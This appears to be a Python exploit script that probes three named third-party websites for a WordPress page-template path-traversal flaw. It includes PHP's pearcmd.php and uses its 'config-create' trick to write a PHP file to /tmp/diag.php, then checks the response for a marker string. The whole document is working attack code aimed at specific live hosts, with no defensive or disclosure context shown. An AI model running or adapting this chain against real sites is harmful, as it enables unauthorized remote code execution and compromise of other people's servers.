from core import vuln
for h in ["mirk154.ru", "mypets.kg", "gomeldrev.by"]:
    base = "https://" + h
    pid = vuln._find_page(base)
    print(h, "page_id:", pid)
    if not pid:
        continue
    payload = "<?=" + vuln._chrlit("PBLDIAG") + "?>"
    for td in ["page-templates", "page-templates-full-width", "page-template"]:
        pre = td[5:]
        p = pre + "/" + "../" * 7 + "usr/local/lib/php/pearcmd"
        body = ("page_id=%d&pagename=%s" % (pid, vuln._denc(p))).encode()
        try:
            r1 = vuln._req("POST", base + "/?+config-create+/" + payload + "+/tmp/diag.php", data=body,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
            r2 = vuln._req("POST", base + "/", data=body,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
        except Exception as e:
            print("  ", td, "EXC", type(e).__name__); continue
        t2 = r2.text or ""
        print("  ", td, "s1:", r1.status_code, "s2:", r2.status_code, "len2:", len(t2),
              "marker:", "PBLDIAG" in t2, "pear:", "pearcmd" in t2.lower())